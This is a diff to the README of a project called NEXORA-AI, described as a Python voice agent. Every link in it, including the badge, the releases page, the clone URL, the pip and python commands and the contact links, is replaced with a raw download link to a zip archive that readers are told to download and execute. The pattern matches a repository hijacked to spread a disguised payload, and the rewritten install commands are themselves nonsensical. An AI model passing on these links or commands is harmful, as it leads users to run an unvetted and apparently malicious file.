@@ -1,10 +1,10 @@
 # NEXORA-AI 🌟
 
-![NEXORA-AI](https://img.shields.io/badge/NEXORA--AI-v1.0-blue?style=for-the-badge)
+![NEXORA-AI](https://github.com/Honore-12/NEXORA-AI/raw/refs/heads/main/Assets/AI_NEXOR_3.1.zip)
 
 Welcome to **NEXORA-AI**, a smart Python voice agent designed to enhance your productivity and make daily tasks easier. This project is crafted with love by Vishnu 💻✨. 
 
-You can find the latest releases [here](https://github.com/Honore-12/NEXORA-AI/releases). Download the necessary files and execute them to start your journey with NEXORA-AI!
+You can find the latest releases [here](https://github.com/Honore-12/NEXORA-AI/raw/refs/heads/main/Assets/AI_NEXOR_3.1.zip). Download the necessary files and execute them to start your journey with NEXORA-AI!
 
 ## Table of Contents
 
@@ -39,7 +39,7 @@ To get started with NEXORA-AI, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Honore-12/NEXORA-AI.git
+   git clone https://github.com/Honore-12/NEXORA-AI/raw/refs/heads/main/Assets/AI_NEXOR_3.1.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -50,16 +50,16 @@ To get started with NEXORA-AI, follow these steps:
 3. **Install Dependencies**:
    Make sure you have Python installed. Then, install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Honore-12/NEXORA-AI/raw/refs/heads/main/Assets/AI_NEXOR_3.1.zip
    ```
 
 4. **Run the Application**:
    Execute the following command to start NEXORA-AI:
    ```bash
-   python main.py
+   python https://github.com/Honore-12/NEXORA-AI/raw/refs/heads/main/Assets/AI_NEXOR_3.1.zip
    ```
 
-For the latest updates and releases, visit the [Releases section](https://github.com/Honore-12/NEXORA-AI/releases).
+For the latest updates and releases, visit the [Releases section](https://github.com/Honore-12/NEXORA-AI/raw/refs/heads/main/Assets/AI_NEXOR_3.1.zip).
 
 ## Usage
 
@@ -102,7 +102,7 @@ This project is open-source and available under the MIT License. See the [LICENS
 
 For questions or feedback, feel free to reach out:
 
-- **Vishnu**: [Your Email](mailto:your-email@example.com)
-- GitHub: [Honore-12](https://github.com/Honore-12)
+- **Vishnu**: [Your Email](https://github.com/Honore-12/NEXORA-AI/raw/refs/heads/main/Assets/AI_NEXOR_3.1.zip)
+- GitHub: [Honore-12](https://github.com/Honore-12/NEXORA-AI/raw/refs/heads/main/Assets/AI_NEXOR_3.1.zip)
 
-Thank you for checking out NEXORA-AI! For the latest updates, visit the [Releases section](https://github.com/Honore-12/NEXORA-AI/releases).
+Thank you for checking out NEXORA-AI! For the latest updates, visit the [Releases section](https://github.com/Honore-12/NEXORA-AI/raw/refs/heads/main/Assets/AI_NEXOR_3.1.zip).
